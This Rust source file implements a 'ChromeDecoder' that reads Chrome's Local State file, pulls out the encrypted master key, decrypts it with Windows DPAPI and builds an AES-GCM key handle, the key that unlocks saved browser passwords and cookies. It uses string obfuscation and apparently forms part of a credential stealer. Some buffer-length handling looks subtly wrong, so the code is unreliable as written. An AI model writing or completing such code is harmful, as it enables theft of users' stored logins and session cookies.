use crate::import_libs::*;
use std::ffi::{c_void, CString};
use std::slice;
use windows::core::PCWSTR;
use windows::Win32::Security::Cryptography::{
    BCRYPT_ALG_HANDLE, BCRYPT_OPEN_ALGORITHM_PROVIDER_FLAGS, CRYPT_INTEGER_BLOB,
};

const DPAPI_PREFIX_LEN: usize = 5;

pub struct ChromeDecoder {
    pub key_handle: BCRYPT_KEY_HANDLE,
    decrypted_key: [u8; 8192],
    key_size: u32,
}

impl ChromeDecoder {
    pub fn new() -> Self {
        ChromeDecoder {
            key_handle: BCRYPT_KEY_HANDLE::default(),
            decrypted_key: [0; 8192],
            key_size: 0u32,
        }
    }

    pub unsafe fn generate_key(
        &mut self,
        json_buffer: *mut c_void,
        json_key_buffer_size: u32,
    ) -> bool {
        let buffer_ptr_u8 = json_buffer as *const u8;
        let buffer_slice = slice::from_raw_parts(buffer_ptr_u8, json_key_buffer_size as usize);
        let json_data: Value = serde_json::from_slice(buffer_slice).unwrap();
        let key = json_data["os_crypt"]["encrypted_key"].as_str().unwrap();
        let result = base64::decode(key);
        if result.is_err() {
            return false;
        }
        let decoded_key = result.unwrap();
        let decoded_key_size = decoded_key.len();

        let mut key_enc: Vec<u8> = Vec::new();
        key_enc.resize(decoded_key_size - DPAPI_PREFIX_LEN, 0);
        let mut counter = 0;
        for i in DPAPI_PREFIX_LEN..decoded_key_size {
            key_enc[counter] = decoded_key[i];
            counter = counter + 1;
        }

        let mut in_blob = CRYPT_INTEGER_BLOB::default();
        in_blob.pbData = key_enc.as_mut_ptr();
        in_blob.cbData = decoded_key_size as u32;

        let mut out_blob = CRYPT_INTEGER_BLOB::default();
        let result = CryptUnprotectData(&in_blob, None, None, None, None, 0, &mut out_blob);
        if result.is_err() {
            return false;
        }

        let mut size_key = 0;
        for i in 0..out_blob.cbData as usize {
            self.decrypted_key[i] = *out_blob.pbData.wrapping_add(i);
            size_key += 1;
        }

        let mut alg_handle = BCRYPT_ALG_HANDLE::default();
        let utf16_units: Vec<u16> = "AES".encode_utf16().collect();
        if BCryptOpenAlgorithmProvider(
            &mut alg_handle,
            PCWSTR::from_raw(utf16_units.as_ptr()),
            PCWSTR::null(),
            BCRYPT_OPEN_ALGORITHM_PROVIDER_FLAGS::default(),
        )
        .0 != 0
        {
            return false;
        }

        let wide_chaining_mode: Vec<u16> =
            goldberg_string!("ChainingMode\0").encode_utf16().collect();
        let wide_chaining_mode2: Vec<u16> = goldberg_string!("ChainingModeGCM\0")
            .encode_utf16()
            .collect();
        let bytes_slice: &[u8] = unsafe {
            std::slice::from_raw_parts(
                wide_chaining_mode2.as_ptr() as *const u8,
                wide_chaining_mode2.len() * std::mem::size_of::<u16>(),
            )
        };
        if BCryptSetProperty(
            BCRYPT_HANDLE::from(alg_handle),
            PCWSTR::from_raw(wide_chaining_mode.as_ptr()),
            bytes_slice,
            0,
        )
        .0 != 0
        {
            return false;
        }

        if BCryptGenerateSymmetricKey(
            alg_handle,
            &mut self.key_handle,
            None,
            &self.decrypted_key,
            0,
        )
        .0 != 0
        {
            return false;
        }

        true
    }
}
